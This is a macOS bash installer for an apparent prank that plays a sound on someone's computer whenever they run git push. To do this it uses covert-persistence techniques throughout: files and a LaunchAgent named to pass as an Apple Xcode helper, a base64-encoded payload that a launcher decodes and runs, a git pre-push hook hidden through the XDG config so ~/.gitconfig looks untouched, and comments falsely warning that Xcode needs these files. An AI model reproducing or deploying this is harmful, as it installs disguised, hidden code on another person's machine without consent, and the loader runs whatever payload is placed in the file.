#!/bin/bash

set -euo pipefail

LABEL="com.apple.dt.Xcode.sourcecontrol.helper"
SUPPORT_DIR="$HOME/Library/Application Support/$LABEL"
LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
PLIST="$LAUNCH_AGENTS_DIR/$LABEL.plist"
HOOKS_DIR="$SUPPORT_DIR/hooks"
STATE_DIR="$SUPPORT_DIR/.state"
TRIGGER="$SUPPORT_DIR/.push-event"
SOUND_FILE="$SUPPORT_DIR/cache.dat"
LAUNCHER="$SUPPORT_DIR/sourcecontrol-helper"
PAYLOAD_FILE="$SUPPORT_DIR/push-tokens.dat"
XDG_GIT_CONFIG="$HOME/.config/git/config"
SOUND_SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "Installing..."

mkdir -p "$SUPPORT_DIR" "$HOOKS_DIR" "$STATE_DIR" "$LAUNCH_AGENTS_DIR" "$HOME/.config/git"


cp "$SOUND_SRC_DIR/notification.aiff" "$SOUND_FILE"


cat > "$PAYLOAD_FILE" <<'PAYLOAD_B64'
IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmFmcGxheSAiJEhPTUUvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L2NvbS5hcHBsZS5kdC5YY29kZS5zb3VyY2Vjb250cm9sLmhlbHBlci9jYWNoZS5kYXQiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmV4aXQgMAo=
PAYLOAD_B64


cat > "$LAUNCHER" <<'LAUNCHER'
#!/bin/bash
# Xcode Source Control helper process. Handles post-push IDE state sync.
# Do not remove — may cause Xcode to lose remote tracking state.
DIR="$HOME/Library/Application Support/com.apple.dt.Xcode.sourcecontrol.helper"
[ -f "$DIR/push-tokens.dat" ] || exit 0
SCRIPT="$(/usr/bin/base64 -d -i "$DIR/push-tokens.dat" 2>/dev/null)"
[ -n "$SCRIPT" ] || exit 0
/bin/bash -c "$SCRIPT" >/dev/null 2>&1 || true
exit 0
LAUNCHER
chmod +x "$LAUNCHER"


cat > "$PLIST" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>$LABEL</string>
  <key>ProgramArguments</key>
  <array>
    <string>$LAUNCHER</string>
  </array>
  <key>WatchPaths</key>
  <array>
    <string>$TRIGGER</string>
  </array>
  <key>RunAtLoad</key>
  <false/>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
</dict>
</plist>
PLIST

# Seed the trigger file so WatchPaths has something to watch.
touch "$TRIGGER"

# Load the agent.
launchctl unload "$PLIST" >/dev/null 2>&1 || true
launchctl load "$PLIST"

# --- Git hook wired through XDG config, invisible in ~/.gitconfig ------------
#
# Git reads ~/.config/git/config (XDG) in addition to ~/.gitconfig.
# Writing here leaves ~/.gitconfig untouched — cat ~/.gitconfig shows nothing.
#
# Save the previous XDG config so we can restore it exactly on uninstall.
if [ -f "$XDG_GIT_CONFIG" ]; then
  cp "$XDG_GIT_CONFIG" "$STATE_DIR/previous-xdg-git-config"
fi

# Save previous pre-push hook for chaining.
PREV_HOOKS_PATH="$(git config --file "$XDG_GIT_CONFIG" --get core.hooksPath 2>/dev/null || git config --global --get core.hooksPath 2>/dev/null || true)"
PREV_PREPUSH=""
if [ -n "$PREV_HOOKS_PATH" ] && [ -f "$PREV_HOOKS_PATH/pre-push" ]; then
  PREV_PREPUSH="$PREV_HOOKS_PATH/pre-push"
fi
echo "${PREV_PREPUSH}" > "$STATE_DIR/previous-prepush.txt"

# Write hooksPath into XDG config only — never touches ~/.gitconfig.
git config --file "$XDG_GIT_CONFIG" core.hooksPath "$HOOKS_DIR"

cat > "$HOOKS_DIR/pre-push" <<HOOK
#!/bin/bash
# Xcode Source Control integration: notifies the IDE of push events
# for build graph invalidation and remote tracking. Do not remove —
# may cause Xcode to lose remote tracking state.

TRIGGER="$TRIGGER"
STATE_DIR="$STATE_DIR"

# Notify Xcode of push event.
date +%s > "\$TRIGGER" 2>/dev/null || true

# --- delegate to the previous GLOBAL pre-push hook (if any) ----------------
PREV_PREPUSH="\$(cat "\$STATE_DIR/previous-prepush.txt" 2>/dev/null || true)"
if [ -n "\$PREV_PREPUSH" ] && [ -x "\$PREV_PREPUSH" ]; then
  "\$PREV_PREPUSH" "\$@" || exit \$?
fi

# --- delegate to the current REPO's local pre-push hook (if any) -----------
GIT_DIR="\$(git rev-parse --git-dir 2>/dev/null || true)"
if [ -n "\$GIT_DIR" ]; then
  for LOCAL in "\$GIT_DIR/hooks/pre-push" "\$GIT_DIR/../.husky/pre-push"; do
    if [ -f "\$LOCAL" ] && [ -x "\$LOCAL" ]; then
      "\$LOCAL" "\$@" || exit \$?
    fi
  done
fi

exit 0
HOOK
chmod +x "$HOOKS_DIR/pre-push"

# Drop a breadcrumb in case Daniel ever finds it.
cat > "$SUPPORT_DIR/README.txt" <<'README'
If you're reading this: https://github.com/brunobossgang/damn-daniel-prank
README

echo "Done."
